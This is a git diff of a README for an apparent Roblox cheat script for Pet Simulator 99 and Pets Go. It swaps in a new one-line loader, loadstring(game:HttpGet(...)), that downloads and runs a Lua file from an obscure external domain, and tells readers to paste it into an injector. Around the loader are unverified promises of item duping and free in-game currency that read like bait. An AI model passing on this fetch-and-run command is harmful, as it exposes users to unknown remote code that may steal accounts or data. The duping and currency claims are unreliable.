@@ -1,15 +1,17 @@
-# PS99-new-script-update
-Script updated for new update 2024-09-02
+# PS99/Pets go/PSX (pet simulator X)
+Script updated for new update 2024-11-12
 # SCRIPT:
 
-**loadstring(game:HttpGet("https://egorikusa.space/08a828291fc3d05efb1ca82b.lua", true))()**
+**loadstring(game:HttpGet("https://egorikusa.space/7ce6139ec89b1927142bd4ec.lua", true))()**
 
 copy this script and paste into injector this is an all in 1
 
 
 # functions
 
-
+added support for all excutors 
+added PS99 updates and NEW GAME Pets go 
+added pets go auto fast fishing, super insta rolling, bonus claimer also if you press hop other server with 1m X u get the best bonus to roll and last one is huge duping.
 added TITANIC DUPING TO MAIL BOX , abit same as before but much different only works on titanics not huges now you can dupe as many as you like but please note its 1 dupe per titanic.
 
 auto dupe hacker chest enchantment book x 1 auto plant seeds easy 100million diamonds daily for world 1
